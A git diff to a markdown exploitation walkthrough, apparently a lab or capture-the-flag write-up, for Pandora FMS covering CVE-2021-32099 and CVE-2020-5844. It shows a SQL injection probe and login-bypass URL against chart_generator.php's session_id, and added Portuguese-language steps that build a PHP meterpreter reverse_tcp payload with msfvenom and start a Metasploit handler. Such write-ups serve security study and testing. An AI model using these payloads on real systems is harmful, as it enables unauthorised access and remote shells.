@@ -44,6 +44,7 @@ v7.0NG.742_FIX_PERL2020
 - [CVE-2021-32099](https://nvd.nist.gov/vuln/detail/CVE-2021-32099)
 - [CVE-2020-5844](https://nvd.nist.gov/vuln/detail/CVE-2020-5844)
 
+## CVE-2021-32099
 6. Test the target system with malformed input values'    "   `   %    %%   --   /*   //    )    ;
 http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=%27%20%20%20%20%22%20%20%20`%20%20%20%%20%20%20%20%%%20%20%20--%20%20%20/*%20%20%20//%20%20%20%20)%20%20%20%20;
 
@@ -68,6 +69,15 @@ http://127.0.0.1/pandora_console/include/chart_generator.php?session_id='OR `dat
 and then your user will be logged
 ````
 http://127.0.0.1/pandora_console/
+````
+
+## CVE-2020-5844
+
+8. Crie o payload e inicie o multi handler
+
+````php
+$ msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -o payload.php
+$ msfconsole -qx "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LPORT 4444; set LHOST tun0; exploit"
 ````
 
 
